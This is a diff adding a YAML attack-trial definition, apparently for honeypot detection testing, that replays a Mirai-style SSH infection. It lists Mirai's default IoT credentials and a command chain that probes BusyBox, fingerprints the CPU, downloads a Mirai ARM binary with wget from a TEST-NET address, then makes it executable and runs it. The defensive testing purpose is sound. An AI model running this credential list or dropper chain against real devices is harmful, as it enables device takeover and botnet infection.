@@ -1,0 +1,31 @@
+id: mirai-style-infection
+name: Mirai-style infection chain
+description: Credential list from Mirai's table until root/root works, BusyBox applet probe, CPU fingerprint, then a dropper fetch from an unroutable TEST-NET address and chmod in /tmp. Cowrie emulates
+  every command.
+trial_kind: attack
+target_services:
+- ssh
+expected_detection: MALWARE_DOWNLOAD
+severity: critical
+models: T1110.001 -> T1059.004 -> T1105
+steps:
+- service: ssh
+  credentials:
+  - - admin
+    - admin
+  - - root
+    - xc3511
+  - - root
+    - vizxv
+  - - support
+    - support
+  - - root
+    - root
+  attempt_interval: 1
+  commands:
+  - /bin/busybox ECCHI
+  - cat /proc/cpuinfo
+  - cd /tmp || cd /var/run
+  - wget http://198.51.100.23/bins/mirai.arm7 -O .x
+  - chmod 777 .x
+  - ./.x scanner
